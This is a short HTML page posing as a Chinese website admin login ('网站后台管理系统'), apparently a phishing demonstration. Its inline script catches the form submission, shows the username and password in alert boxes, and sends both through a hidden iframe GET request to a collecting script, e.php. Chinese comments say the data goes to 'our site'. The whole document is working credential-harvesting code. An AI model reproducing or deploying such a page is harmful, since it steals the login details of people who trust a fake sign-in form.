<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>网站后台管理系统 </title>
</head>
<body>
<form action="#" method="POST" id="form">
<input type="text" name="username">
<input type="password" name="password">
<input type="submit">
</form>
<script>
    form=document.getElementById('form');   //获取form表单
    form.onsubmit=function(){
      var iframe=document.createElement("iframe"); //创建一个iframe 内联框架

      iframe.style.display="none";   //设置内联框架为隐藏模式

      alert(form.username.value);    //弹出表单里的账号的值

      alert(form.password.value);    //弹出表单里密码的值

      iframe.src="./e.php?username=" + form.username.value + "&password=" + form.password.value;           //对我们的站点发送GET请求，请求中附带着账号密码的数据

      document.body.appendChild(iframe); 
    }
</script>
</body>
</html>
